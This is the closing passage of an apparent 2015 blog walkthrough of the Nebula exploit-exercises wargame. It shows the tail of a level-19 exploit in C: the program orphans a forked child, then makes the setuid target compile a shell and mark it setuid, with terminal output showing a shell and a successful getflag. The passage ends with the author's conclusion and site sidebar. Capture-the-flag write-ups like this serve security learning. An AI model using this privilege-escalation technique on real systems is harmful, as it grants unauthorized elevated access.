</span><span class='line'>    <span class="k">if</span> <span class="o">(</span><span class="nv">pid</span> <span class="o">==</span> 0<span class="o">)</span> <span class="o">{</span>
</span><span class='line'>
</span><span class='line'>        char *arg<span class="o">[]</span> <span class="o">=</span> <span class="o">{</span> <span class="s2">&quot;/bin/sh&quot;</span> , <span class="s2">&quot;-c&quot;</span> , <span class="s2">&quot;gcc /var/tmp/shell.c -o /var/tmp/flag19; chmod 4777 /var/tmp/flag19&quot;</span> , NULL<span class="o">}</span><span class="p">;</span>
</span><span class='line'>        sleep<span class="o">(</span>2<span class="o">)</span><span class="p">;</span> /* Give the fork 2 sec to orphan */
</span><span class='line'>        execv<span class="o">(</span><span class="s2">&quot;/home/flag19/flag19&quot;</span>, arg<span class="o">)</span><span class="p">;</span>
</span><span class='line'>        <span class="nb">printf</span><span class="o">(</span><span class="s2">&quot;Done fork\n&quot;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>        <span class="k">return </span>0<span class="p">;</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="nb">printf</span><span class="o">(</span><span class="s2">&quot;Done parent\n&quot;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>    <span class="k">return </span>0<span class="p">;</span>
</span><span class='line'><span class="o">}</span>
</span><span class='line'>
</span><span class='line'>level19@nebula:/var/tmp<span class="nv">$ </span>gcc pwn19.c -o pwn19
</span><span class='line'>level19@nebula:/var/tmp<span class="nv">$ </span>./pwn19
</span><span class='line'>Done parent
</span><span class='line'>
</span><span class='line'>level19@nebula:/var/tmp<span class="nv">$ </span>/var/tmp/flag19
</span><span class='line'>sh-4.2<span class="nv">$ </span>getflag
</span><span class='line'>You have successfully executed getflag on a target account
</span></code></pre></td></tr></table></div></figure>


<h2>conclusion</h2>

<p>Even though many of the levels were really really easy, the latter levels did force me to learn a few new things which was great. I think this is some really good learning material for people new to the scene. Heck, I think I will refer people to this next time they ask about OSCP&hellip; ;)</p>

<p>As a final touch, my &lsquo;loot&rsquo; in <code>/var/tmp</code> after finishing the last level:</p>

<p><img src="https://i.imgur.com/JHZHRJD.png"></p>
</div>


  <footer>
    <p class="meta">
      
  

<span class="byline author vcard">Posted by <span class="fn">Leon Jacobs</span></span>

      








  


<time datetime="2015-05-09T07:18:31+02:00" pubdate data-updated="true">May 9<sup>th</sup>, 2015</time>
      

<span class="categories">
  
    <a class='category' href='/blog/categories/ctf/'>ctf</a>, <a class='category' href='/blog/categories/exercises/'>exercises</a>, <a class='category' href='/blog/categories/exploit/'>exploit</a>, <a class='category' href='/blog/categories/solution/'>solution</a>
  
</span>


    </p>
    
      <div class="sharing">
  
  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://leonjza.github.io/blog/2015/05/09/playing-exploit-exercises-nebula/" data-via="leonjza" data-counturl="http://leonjza.github.io/blog/2015/05/09/playing-exploit-exercises-nebula/" >Tweet</a>
  
  
  
</div>

    
    <p class="meta">
      
        <a class="basic-alignment left" href="/blog/2015/02/21/beating-sokar-the-vulnhub-turns-0b10-challenge/" title="Previous Post: beating sokar - the vulnhub turns 0b10 challenge">&laquo; beating sokar - the vulnhub turns 0b10 challenge</a>
      
      
    </p>
  </footer>
</article>

</div>

<aside class="sidebar">
  
    <section>
  <h1>About Me</h1>
  <br>
  <p>
    <a href="https://leonjza.github.io/about/">Another caffeine fueled security guy.</a>
 </p>
</section>
<section>
 <p>
    <a href="http://www.offensive-security.com/information-security-certifications/oscp-offensive-security-certified-professional/"><img src="https://i.imgur.com/Ew3ZXtn.png"></a>
 </p>
</section>
<section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/blog/2015/05/09/playing-exploit-exercises-nebula/">playing exploit-exercises - nebula</a>
      </li>
    
      <li class="post">
        <a href="/blog/2015/02/21/beating-sokar-the-vulnhub-turns-0b10-challenge/">beating sokar - the vulnhub turns 0b10 challenge</a>
      </li>
    
      <li class="post">
        <a href="/blog/2015/02/20/a-trivial-ios-jailbreak-detection-bypass/">a trivial iOS jailbreak detection bypass</a>
      </li>
    
      <li class="post">
        <a href="/blog/2015/02/09/no-more-jailbreak-detection-an-adventure-into-android-reversing-and-smali-patching/">no more jailbreak detection - an adventure into Android app reversing and smali patching</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/12/23/hoof-to-root-solving-pegasus-1/">hoof to root ? - solving pegasus 1</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/12/06/playing-in-the-playground-a-offsec-virtual-pentesting-labs-review/">playing in the playground - a offsec virtual pentesting labs review</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/11/22/trying-harder-oscp-and-me/">trying harder - oscp and me</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/11/09/solving-kvasir-netcat-edition/">solving kvasir - netcat edition</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/10/14/knock-knock-whos-there-solving-knock-knock/">knock-knock who’s there?</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/10/10/another-troll-tamed-solving-troll-2/">another troll tamed - solving troll 2</a>
      </li>
    
  </ul>
</section>

<section>
  <h1>GitHub Repos</h1>
  <ul id="gh_repos">
    <li class="loading">Status updating...</li>
  </ul>
  
  <a href="https://github.com/leonjza">@leonjza</a> on GitHub
  
  <script type="text/javascript">
    $(document).ready(function(){
        if (!window.jXHR){
            var jxhr = document.createElement('script');
            jxhr.type = 'text/javascript';
            jxhr.src = '/javascripts/libs/jXHR.js';
            var s = document.getElementsByTagName('script')[0];
            s.parentNode.insertBefore(jxhr, s);
        }

        github.showRepos({
            user: 'leonjza',
            count: 8,
            skip_forks: true,
            target: '#gh_repos'
        });
    });
  </script>
  <script src="/javascripts/github.js" type="text/javascript"> </script>
</section>


  
</aside>


    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2015 - Leon Jacobs -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  







  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = '//platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>





</body>
</html>
